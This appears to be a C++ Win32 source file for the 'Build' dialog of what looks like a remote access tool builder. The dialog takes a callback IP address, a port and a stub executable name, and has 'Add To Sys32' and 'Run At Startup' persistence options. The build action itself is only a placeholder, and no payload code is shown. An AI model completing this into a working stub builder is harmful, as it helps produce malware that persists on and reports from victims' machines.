#include "stdafx.h"
#include "BuildProc.h"

LRESULT BuildProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	Theme::Build* pBuild = (Theme::Build*)GetWindowLongPtr(hWnd, GWLP_USERDATA);
	
	switch (message)
	{
	case WM_NCHITTEST:
	{
		UINT uHitTest;

		uHitTest = DefWindowProc(hWnd, WM_NCHITTEST, wParam, lParam);
		if (uHitTest == HTCLIENT)
			return HTCAPTION;
		return uHitTest;
	}
	break;
	case WM_SHOWWINDOW:
	{
		if (pBuild->data.Applied)
		{
			SetWindowText(pBuild->HWND.Address, pBuild->data.Address);
			SetWindowText(pBuild->HWND.Port, pBuild->data.Port);
			SetWindowText(pBuild->HWND.StubName, pBuild->data.StubName);
			if (pBuild->data.Sys32)
				SendMessage(pBuild->HWND.Sys32, WM_MOUSEACTIVATE, 0, 1);
			if (pBuild->data.Startup)
				SendMessage(pBuild->HWND.Startup, WM_MOUSEACTIVATE, 0, 1);
			//InvalidateRect(hWnd, 0, TRUE);
		}
		return DefWindowProc(hWnd, message, wParam, lParam);
	}
	case WM_CREATE:
	{
		RECT r = { NULL };
		r.left = 14;

		pBuild = (Theme::Build*)malloc(sizeof(Theme::Build));
		if (pBuild == NULL)
			return FALSE;

		SetWindowLongPtr(hWnd, GWLP_USERDATA, (LONG_PTR)pBuild);
		pBuild->data.Applied = FALSE;
		pBuild->data.Startup = FALSE;
		pBuild->data.Sys32 = FALSE;
		
		pBuild->HWND.Address = Theme::CWindow(r, L"Segoe UI", L"CEDIT",L"IP/Address", WS_VISIBLE ,
			20, 50, 100, 15, hWnd, (HMENU)IDE_ADDRESS);
		pBuild->HWND.Port = Theme::CWindow(r, L"Segoe UI", L"CEDIT", L"Port", WS_VISIBLE,
			20, 80, 80, 15, hWnd, (HMENU)IDE_PORT);
		pBuild->HWND.StubName = Theme::CWindow(r, L"Segoe UI", L"CEDIT", L"stub.exe", WS_VISIBLE,
			20, 110, 80, 15, hWnd, (HMENU)IDE_STUBNAME);


		pBuild->HWND.Sys32 = Theme::CWindow(r, L"Segoe UI", L"CBUTTON", L"Add To Sys32", WS_VISIBLE,
			165, 45, 110, 20, hWnd, (HMENU)IDB_SYS32);
		pBuild->HWND.Startup = Theme::CWindow(r, L"Segoe UI", L"CBUTTON", L"Run At Startup", WS_VISIBLE,
			165, 65, 115, 20, hWnd, (HMENU)IDB_STARTUP);
	
		pBuild->HWND.Build = Theme::CWindow(r, L"Segoe UI", L"CBUTTON", L"Build", WS_VISIBLE,
			200, 155, 30, 15, hWnd, (HMENU)IDB_CREATE);
		pBuild->HWND.Exit = Theme::CWindow(r, L"Segoe UI", L"CBUTTON", L"Close", WS_VISIBLE,
			40, 155, 40, 15, hWnd, (HMENU)IDM_EXIT);
		
	}
	break;
	case WM_COMMAND: 
	{
		int wmId = LOWORD(wParam);
		switch (wmId)
		{
		case IDB_SYS32:
			pBuild->data.Sys32 = !pBuild->data.Sys32;
			break;
		case IDB_STARTUP:
			pBuild->data.Startup = !pBuild->data.Startup;
			break;
		case IDB_CREATE: {
			GetWindowText(pBuild->HWND.Address, pBuild->data.Address, sizeof(pBuild->data.Address) / sizeof(wchar_t));
			GetWindowText(pBuild->HWND.Port, pBuild->data.Port, sizeof(pBuild->data.Port) / sizeof(wchar_t));
			GetWindowText(pBuild->HWND.StubName, pBuild->data.StubName, sizeof(pBuild->data.StubName) / sizeof(wchar_t));
			//TODO: CreateFunction//
			//Tell Main Window to save this data for next time user opens up the build menu.
			pBuild->data.Applied = TRUE;
			SendMessage(pBuild->HWND.Parent, WM_COMMAND, LOWORD(IDB_BUILD), IDB_BUILD);
			MessageBox(hWnd, L"PlaceHolder for Build Event", L"Nice", 0);

			SendMessage(pBuild->HWND.Build, WM_MOUSEACTIVATE, 0, 1);
		}
			break;
		case IDM_EXIT:

			DestroyWindow(hWnd);

			break;
		default:
			return DefWindowProc(hWnd, message, wParam, lParam);
		}
		
	}
	break;
	case WM_PAINT:
	{
		RECT r = { 0 };
		GetClientRect(hWnd, &r);
		PAINTSTRUCT ps;
		HDC hdc = BeginPaint(hWnd, &ps);
		HDC hdcMem = GetDC(hWnd);
		HPEN hp = CreatePen(PS_SOLID, 1, RGB(80, 80, 80));
		int halfpoint = r.right / 2;
		SelectObject(hdcMem, hp);
		MoveToEx(hdcMem, 0, 32, 0);
		LineTo(hdcMem, r.right, 32);
		MoveToEx(hdcMem, 0, 145, 0);
		LineTo(hdcMem, r.right, 145);
		MoveToEx(hdcMem, r.right / 2, 32, 0);
		LineTo(hdcMem, r.right / 2, 145);

		int i = r.right /2;
		SetTextColor(hdc, RGB(200, 200, 200));

		HANDLE Font = Theme::CreateCFont({ 0,0,0,0 }, L"Segoe UI");

		SelectObject(hdc, Font);
		SetBkColor(hdc, RGB(0x2C, 0x2C, 0x2C));
		WCHAR staticText[99];
		int len = SendMessage(hWnd, WM_GETTEXT,
			_ARRAYSIZE(staticText), (LPARAM)staticText);

		if (len == NULL)
			return FALSE;
		Theme::DrawTextC({ i,0,0,15 }, hdc, staticText, len, 1);



		EndPaint(hWnd, &ps);
		ReleaseDC(hWnd, hdc);	
	}
	break;

	default:
		return DefWindowProc(hWnd, message, wParam, lParam);


	}


	return 0;
}
